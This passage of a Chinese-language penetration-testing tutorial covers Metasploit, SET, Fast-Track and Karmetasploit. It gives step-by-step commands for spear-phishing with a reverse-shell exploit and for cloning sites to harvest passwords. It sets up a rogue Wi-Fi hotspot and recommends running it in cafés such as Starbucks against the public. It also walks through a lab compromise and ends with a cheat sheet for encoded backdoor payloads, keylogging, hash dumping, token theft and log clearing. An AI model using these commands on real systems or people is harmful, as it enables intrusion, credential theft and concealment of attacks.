24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>配置文件config/set_config，当使用基于web的攻击方式时可以将email功能打开：</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">vi config/set_config:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">METASPLOIT_PATH=/opt/framework3/msf3</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">WEBATTACK_EMAIL=ON</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>使用Java applet attack进行攻击的时候默认使用Microsoft作为发布者名称，如果需要自定义则需要安装JDK并打开配置项：</p><p><code>SELF_SIGNED_APPLET=ON</code></p><p>SET默认打开AUTO_DETECT项，自动探测本机IP并用于攻击中的各项配置。如果本机是多网卡需要手动指定IP，则需将此项关闭：</p><p><code>AUTO_DETECT=OFF</code></p><p>SET默认使用内建的python提供的web server供使用，如需使用apache作为服务则需要本机安装apache并打开配置项：</p><p><code>APACHE_SERVER=ON</code></p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="2网络钓鱼攻击">2、网络钓鱼攻击:<a class="hash-link" href="#2网络钓鱼攻击" title="标题的直接链接">​</a></h3><p>Spear-Phishing Attack Vector,利用文件格式漏洞（如PDF）等生成后门并通过email（GMAIL,SENDMAIL,）向目标发送带后门附件的电子邮件，诱使目标打开附件激活后门。</p><p>例子：</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">./set</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">此时选择菜单1.Spear-Phishing Attack Vectors</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">继续选择：1.Perform a Mass Email Attack</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">选择exploit：8.Adobe Collab.collectEmailInfo Buffer Overflow</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">选择payload：4.Windows Reverse TCP Shell</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">选择是否更改文件名：1.Keep the filename</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">选择发送邮件方式1.Email Attack Single Email Address</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">选择邮件模板1.Pre-Defined Template</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">5.Status Report</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">输入收件方email地址：webmanager@exmaple.com</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">选择发件方式：1.Use a GMAIL Account for your email attack</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">输入发件gmail和密码</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">选择是否立即监听端口等待连接:yes</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>此时SET会使用刚才的设定全自动监听指定端口。</p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="3web方式攻击">3、WEB方式攻击：<a class="hash-link" href="#3web方式攻击" title="标题的直接链接">​</a></h3><p>SET可以克隆一个网站并植入后门以此迷惑目标打开此网站并中招。</p><ul><li>Java Applet方式：最成功的方式之一，并不是利用java的漏洞，而是当目标浏览含后门的仿冒站点时会被询问是否允许执行web中的java applet，一旦点击允许则payload开始运行，目标将被重定向到真实的网站。</li><li>用户端（Client-side）web exploit方式：利用用户端存在的软件漏洞，一般使用0day进行攻击的效果最好。</li><li>账号密码获取（Username and Password Harvesting）：通过克隆一个目标站并诱使攻击目标登陆，截获其账号密码。例如截获GMAIL密码。</li><li>标签页绑架（Tabnabbing）：当目标打开多个标签页浏览网站并切换标签页时，网站侦测到目标的行为并显示让目标等待的信息，恰好目标打开了被绑架的标签页并要求在相似程度惊人的网站里输入登陆凭据，当目标输入之后登陆信息即被截获，同时被重定向到真实网站。</li><li>中间人攻击（Man-Left-in-the-Middle）：此方式使用已经被攻陷的网站的HTTP请求或者网站的XSS漏洞让用户的登陆信息发送至攻击者的HTTP服务器。如果你发现了一个网站的XSS漏洞，可以利用此漏洞构造一个url发送给目标诱使其打开并登陆以截获登陆信息。</li><li>Web Jacking：当目标打开我们的网站时会有一个链接显示为正确的web地址，此时若目标打开此仿冒链接会被定向到我们的仿冒网站，其登陆信息会被截获。</li><li>混合模式（multi-attack）：可同时使用以上多种攻击手段以提高成功率。</li><li>介质感染攻击（Infectious Media Generator）：可以让你生成一张光盘或者u盘，里面包含autorun.inf来运行指定的后门文件或者file-format漏洞文件。</li><li>迷你USB人机接口设备（Teensy USB HID）：当电脑插入USB设备且autorun.inf被禁用时，可使用此方法将USB设备模拟成一个键盘或鼠标设备，进而截获目标机器的击键记录。</li></ul><h3 class="anchor anchorWithStickyNavbar_LWe7" id="set其他特殊功能">SET其他特殊功能：<a class="hash-link" href="#set其他特殊功能" title="标题的直接链接">​</a></h3><p>包括SET交互式shell，可用来替代meterpreter；远程管理工具（RATTE）；HTTP隧道，当目标主机只开放HTTP端口对外放行时可通过此功能与主机进行通信；WEB-GUI，包含了常用攻击和无线攻击向导，输入./set-web即可运行。</p><p>（SET新版本变动较大，请自行摸索。）</p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="十一fast-track">十一．FAST-TRACK<a class="hash-link" href="#十一fast-track" title="标题的直接链接">​</a></h2><p>Fast-Track和SET一样都是python编写的，同样是使用MSF提供的payload以及用户端攻击向导等，作为对MSF的补充，它提供了如MSSQL攻击，更多的exploit，浏览器攻击向导等。fasttrack位于/pentest/exploits/fasttrack/。</p><p>交互式模式：<code>./fast-track.py -i</code></p><p>命令行模式：<code>./fast-track.py -c</code></p><p>Web界面模式：<code>./fast-track.py -g</code></p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="1mssql工具">1、MSSQL工具：<a class="hash-link" href="#1mssql工具" title="标题的直接链接">​</a></h3><p>MSSQL注入漏洞攻击：</p><p>攻击时你只需要输入有注入漏洞的url地址，地址里面用INJECTHERE标识可注入字段，如<a href="http://example.com/show.asp?id=INJECTHERE&amp;date=2012%EF%BC%8Cfast-track%E4%BC%9A%E5%85%A8%E8%87%AA%E5%8A%A8%E6%B3%A8%E5%85%A5%EF%BC%8C%E4%B8%80%E6%97%A6%E6%88%90%E5%8A%9F%E4%BC%9A%E7%BB%99%E4%BD%A0%E8%BF%94%E5%9B%9E%E4%B8%80%E4%B8%AAcmd" target="_blank" rel="noopener noreferrer">http://example.com/show.asp?id=INJECTHERE&amp;date=2012，fast-track会全自动注入，一旦成功会给你返回一个cmd</a> shell。
注入也支持POST参数，如果是POST的话更加简单，只需要你输入url地址，fast-track会自动判断并尝试进行注入。</p><p>SQL暴力破解：另外一个实用的功能是暴力破解器（MSSQL Bruter），可以寻找mssql弱口令，一旦获取到一个sa权限的访问权限，将自动返回一个shell。</p><p>SQL注入批量扫描器（SQLPwnage）：此功能可扫描指定网段的所有打开80端口的主机，并扫描是否存在sql注入点，一旦发现注入点将自动尝试攻击并通过xp_cmdshell获取系统权限。</p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="2binary-hex-转换器">2、Binary-HEX 转换器：<a class="hash-link" href="#2binary-hex-转换器" title="标题的直接链接">​</a></h3><p>当你已经进入一个系统且需要上传可执行文件上去，就可以使用这个工具将可执行的二 进制文件转换为HEX十六进制编码，然后复制粘贴过去即可。</p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="3批量用户端攻击">3、批量用户端攻击：<a class="hash-link" href="#3批量用户端攻击" title="标题的直接链接">​</a></h3><p>和浏览器攻击差不多，但是增加了对目标的ARP缓冲区和DNS感染（只能是在测试者 和目标处于同一网段的情况下），以及MSF里面没有的浏览器溢出exploit。当目标浏览 恶意网站的时候，fast-track尝试着使用所有的exp对目标机器进行溢出，一旦某个exp 起作用将获取到目标机器的控制权限。</p><p>（新版本fasttrack中还加入了Autopwn Automation、Nmap Scripting Engine、Exploits、Payload Generator等新功能。）</p><p>脚本化的工具有时确实能减少很多工作时间，但是不能完全依赖于这类自动程度很高的工具，特别是在用这些工具搞不定目标的时候，手工测试的能力往往才是王道，细节决定成败。</p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="十二karmerasploit">十二．KARMERASPLOIT<a class="hash-link" href="#十二karmerasploit" title="标题的直接链接">​</a></h2><p>Karmetasploit = Karma + Metasploit，也可以说成它是MSF的KARMA实现。</p><p>Karma和MSF一样也是使用ruby语言编写的，其功能是建立一个虚假的无线接入点，等待目标连接上钩。与MSF结合可实现更强大的功能。Karmetasploit集成了DNS,POP3，IMAP4，SMTP,FTP,SMB,HTTP等服务用于攻击，模块位于modules/auxiliary/server目录下。</p><p>基本配置：</p><p>需要的配置不多，首先需要配置一个DHCP服务为目标提供动态IP分配，配置文件：</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">option domain-name-servers 10.0.0.1;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">default-lease-time 60;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">max-lease-time 72;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">ddns-update-style none;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">authoritative;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">log-facility local7;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">subnet 10.0.0.0 netmask 255.255.255.0 {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">range 10.0.0.100 10.0.0.254;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">option routers 10.0.0.1;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">option domain-name-servers 10.0.0.1;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>将配置文件保存在/etc/dhcp3/dhcpd.conf</p><p>下一步下载karma  msf脚本：</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">wget http://www.offensive-security.com/downloads/karma.rc</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">#将网卡激活为监听模式：</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">airmon-ng start wlan0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">#创建伪装接入点,-P 可被扫描到，-C 信号发射速率，-e 接入点名称（需要具有欺骗性），-v 指定网卡，mon0为上一步完成后生成的：</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">airbase-ng -P -C 30 -e &quot;China-Net-Free&quot; -v mon0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">#此时会生成一个名为at0的新网卡接口。</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">#接着打开DHCP服务：</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">ifconfig at0 up 10.0.0.1 netmask 255.255.255.0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">dhcpd3 -cf /etc/dhcp3/dhcpd.conf at0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">#检查是否成功启动：</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">ps aux|grep dhcpd</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">tail -f /var/log/messages</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">#下一步加载karma脚本：</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">msf&gt; resource karma.rc</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>等待收获：</p><p>当对方打开邮件客户端并登陆收取邮件，那么他的账户密码将被截获，因为他所连接的DNS和POP3都是虚假的。
当对方打开浏览器准备浏览网页时karma开始截取cookie，建立虚假email，DNS等服务，加载exploits来对付客户端浏览器，如果走运的话可以获取到shell。
总结：建议这招可以拿到麦当劳，星巴克用，效果更好。</p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="十三构建自己的模块编写自己的exploitmeterpreter脚本编程">十三．构建自己的模块，编写自己的exploit，meterpreter脚本编程<a class="hash-link" href="#十三构建自己的模块编写自己的exploitmeterpreter脚本编程" title="标题的直接链接">​</a></h2><p>这三章留着后面看，需要有ruby基础等编程基础。</p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="十四渗透实战演习">十四．渗透实战演习<a class="hash-link" href="#十四渗透实战演习" title="标题的直接链接">​</a></h2><p>首先需要下载并安装一个专门用来练习渗透的虚拟机Metasploitable：</p><p><a href="http://updates.metasploit.com/data/Metasploitable.zip.torrent" target="_blank" rel="noopener noreferrer">http://updates.metasploit.com/data/Metasploitable.zip.torrent</a></p><p>虚拟机IP：172.16.32.162 用户名密码：msfadmin</p><p>WINXP：172.16.32.131   开放80端口 有防火墙</p><p>情报收集：</p><p><code>nmap -sT -P0 172.16.32.131</code></p><p>msfconsole：</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">cd /opt/framework3/msf3/</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">msfconsole</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">msf&gt; use multi/handler</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set payload windows/meterpreter/reverse_tcp</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set lhost 172.15.32.129</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set lport 443</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">load auto_add_route</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">exploit -j</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">run getgui -e -f 8080</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">shell</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">net user msf msf /add</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">net localgroup administrators msf /add</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">upload nmap.exe</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">nmap.exe -sT -A -P0 172.16.32.162</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">msf&gt; use auxiliary/scanner/ftp/ftp_version</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set RHOSTS 172.16.32.162</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">run</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">msf&gt; use auxiliary/scanner/smtp/smtp_version</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set RHOSTS  172.16.32.162</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">run</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">search tomcat_mgr_login</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set rhosts 172.16.32.162</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set threads 50</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set rport 8180</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set verbose false</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">run</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">use multi/http/tomcat_mgr_deploy</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set password tomcat</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set username tomcat</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set rhost 172.16.32.162</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set lport 9999</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set rport 8180</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set payload linux/x86/shell_bind_tcp</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">exploit</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">search distcc_exec</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set payload linux/x86/shell_reverse_tcp</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set lhost 172.16.32.129</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set rhost 172.16.32.162</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">show payloads</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set payload cmd/unix/reverse</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">exploit</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h2 class="anchor anchorWithStickyNavbar_LWe7" id="十五常用命令备忘">十五．常用命令备忘<a class="hash-link" href="#十五常用命令备忘" title="标题的直接链接">​</a></h2><h3 class="anchor anchorWithStickyNavbar_LWe7" id="msfconsole--commands">MSFconsole  Commands<a class="hash-link" href="#msfconsole--commands" title="标题的直接链接">​</a></h3><ul><li>show exploits 查看所有exploit</li><li>show payloads 查看所有payload</li><li>show auxiliary 查看所有auxiliary</li><li>search name 搜索exploit等</li><li>info 查看加载模块的信息</li><li>use name 加载模块</li><li>LHOST 本机IP</li><li>RHOST 目标IP</li><li>set function 设置选项值</li><li>setg function  全局设置</li><li>show options 查看选项</li><li>show targets 查看exp可选的平台</li><li>set target num 设置exp作用平台</li><li>set payload payload  设置payload</li><li>show advanced 查看高级选项</li><li>set autorunscript migrate -f 设置自动执行指令</li><li>check 测试是否可利用</li><li>exploit 执行exp或模块</li><li>exploit  -j 作为后台执行</li><li>exploit  -z 成功后不立即打开session</li><li>exploit  -e encoder 指定encoder</li><li>exploit  -h  查看帮助信息</li><li>sessions  -l -v 列出可用sessions详细信息</li><li>sessions  -s script 在指定session执行脚本</li><li>sessions -K 结束session</li><li>sessions -c cmd 执行指定命令</li><li>sessions -u sessionID 升级shell</li><li>db_create name 创建数据库</li><li>db_connect name   连接数据库</li><li>db_nmap nmap扫描并导入结果</li><li>db_autopwn -h      查看autopwn帮助</li><li>db_autopwn -p -r -e 基于端口，反弹shell</li><li>db_destroy 删除数据库</li></ul><h3 class="anchor anchorWithStickyNavbar_LWe7" id="meterpreter-commands">Meterpreter Commands<a class="hash-link" href="#meterpreter-commands" title="标题的直接链接">​</a></h3><ul><li>help 查看帮助</li><li>run scriptname 运行脚本</li><li>sysinfo 系统基本信息</li><li>ls 列目录</li><li>use priv 运行提权组件</li><li>ps 列进程</li><li>migrate PID PID迁移</li><li>use incognito token窃取</li><li>list_tokens -u 查看可用用户token</li><li>list_tokens -g 查看可用组token</li><li>impersonate_token DOMAIN_NAME<!-- -->\<!-- -->USERNAME 模仿token</li><li>steal_token PID 窃取PID所属token并模仿</li><li>drop_token 停止模仿token</li><li>getsystem 获取SYSTEM权限</li><li>shell 运行shell</li><li>execute -f cmd.exe -i 交互式运行cmd</li><li>execute -f cmd.exe -i -t 使用可用token运行</li><li>execute -f cmd.exe -i -H -t 同上，同时隐藏进程</li><li>rev2self 返回至初始用户</li><li>reg command 修改注册表</li><li>setkesktop number 切换至另一已登录用户屏幕</li><li>screenshot 截屏</li><li>upload file 上传文件</li><li>download file  下载文件</li><li>keyscan_start 开始截取击键记录</li><li>keyscan_stop 停止截取击键记录</li><li>getprivs 尽可能提升权限</li><li>uictl enable keyboard/mouse 获取键盘或鼠标的控制权</li><li>background 将当前meterpreter shell转入后台</li><li>hashdump 导出所有用户hash</li><li>use sniffer 加载嗅探模块</li><li>sniffer_interfaces 查看可用网卡接口</li><li>sniffer_dump interfaceID pcapname 开始嗅探</li><li>sniffer_start interfaceID packet-buffer 指定buffer范围嗅探</li><li>sniffer_stats interfaceID   抓取统计信息</li><li>sniffer_stop interfaceID  停止嗅探</li><li>add_user username password -h ip 添加用户</li><li>add_group_user &quot;Domain Admins&quot; username -h ip 添加用户至管理组</li><li>clearev 清空日志</li><li>timestomp 改变文件属性如创建时间等</li><li>reboot 重启</li></ul><h3 class="anchor anchorWithStickyNavbar_LWe7" id="msfpayload-commands">MSFpayload Commands<a class="hash-link" href="#msfpayload-commands" title="标题的直接链接">​</a></h3><ul><li>msfpayload -h 查看帮助</li><li>msfpayload windows/meterpreter/bind_tcp 0 查看指定payload可用选项</li><li>msfpayload windows/meterpreter/reverse_tcp LHOST=192.168.1.2 LPORT=443 X &gt; payload.exe 生成payload.exe</li><li>msfpayload windows/meterpreter/reverse_tcp LHOST=192.168.1.2 LPORT=443 R &gt; payload.raw 保存为RAW格式，可用于msfencode</li><li>msfpayload windows/meterpreter/bind_tcp LPORT=443 C &gt; payload.c 保存为C格式</li><li>msfpayload windows/meterpreter/bind_tcp LPORT=443 J &gt; payload.java 保存为java格式</li></ul><h3 class="anchor anchorWithStickyNavbar_LWe7" id="msfencode-commands">MSFencode Commands<a class="hash-link" href="#msfencode-commands" title="标题的直接链接">​</a></h3><ul><li>msfencode -h 查看帮助</li><li>msfencode -l 查看可用encoder</li><li>msfencode -t (c,elf.exe,java.js_le,js_be,perl,raw,ruby,vba,vbs,loop-vbs,asp,war,macho) 以指定格式显示编码后的buffer</li><li>msfencode -i payload.raw -o encoded_payload.exe -e x86/shikata_ga_nai -c 5 -t exe 生成编码后的exe</li><li>msfencode -i payload.raw BufferRegister=ESI -e x86/alpha_mixed -t c 生成纯字符格式C类型shellcode</li><li>msfpayload windows/meterpreter/bind_tcp LPORT=443 R | \
msfencode -e x86/countdown -c 5 -t raw | \
msfencode -e x86/shikata_ga_nai -c 5 -t exe -o multi-encoded.exe 多编码器结合，多次编码</li></ul><h3 class="anchor anchorWithStickyNavbar_LWe7" id="msfcli-commands">MSFcli Commands<a class="hash-link" href="#msfcli-commands" title="标题的直接链接">​</a></h3><ul><li><code>msfcli | grep exploit</code> 只显示exploit</li><li><code>msfcli | grep exploit/windows</code> 只显示windows exploit</li><li><code>msfcli exploit/windows/smb/ms08_067_netapi PAYLOAD=windows/meterpreter/bind_tcp LPORT=443 RHOST=172.16.32.26 E</code> 针对指定IP加载指定exp并设定payload</li></ul><h3 class="anchor anchorWithStickyNavbar_LWe7" id="msfninjafu">MSF,Ninja，Fu<a class="hash-link" href="#msfninjafu" title="标题的直接链接">​</a></h3><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">* msfpayload windows/meterpreter/reverse_tcp LHOST=192.168.1.2 LPORT=443 R | msfencode -x calc.exe -k -o payload.exe -e x86/shikata_ga_nai -c 7 -t exe 使用calc.exe作为模板，生成经过编码的后门</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">* msfpayload windows/meterpreter/reverse_tcp LHOST=192.168.1.2 LPORT=443 R | msfencode -x calc,exe -o payload.exe -e x86/shikata_ga_nai -c 7 -t exe 与上面差不多，只是执行的时候不依赖于生成的可执行文件，且不会有任何提示信息</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">* msfpayload windows/meterpreter/bind_tcp LPORT=443 R | msfencode -o payload.exe -e x86/shikata_ga_nai -c 7 -t exe &amp;&amp; msfcli multi/hanler PAYLOAD=windows/meterpreter/bind_tcp LPORT=443 E 生成编码后的payload并开始监听本机端口</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h3 class="anchor anchorWithStickyNavbar_LWe7" id="msfvenom">MSFvenom<a class="hash-link" href="#msfvenom" title="标题的直接链接">​</a></h3><ul><li>msfvenom --payload 自动生成payload</li></ul><h3 class="anchor anchorWithStickyNavbar_LWe7" id="meterpreter-post-exploitation-commands">Meterpreter Post Exploitation Commands<a class="hash-link" href="#meterpreter-post-exploitation-commands" title="标题的直接链接">​</a></h3><p>提权一般步骤</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">meterpreter&gt; use priv</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">meterpreter&gt; getsystem</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">meterpreter&gt; ps </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">meterpreter&gt; steal_token 1784</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">meterpreter&gt; shell</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">net user msf msf /add /DOMAIN</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">net group &quot;Domain Admins&quot; msf /add /DOMAIN</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" 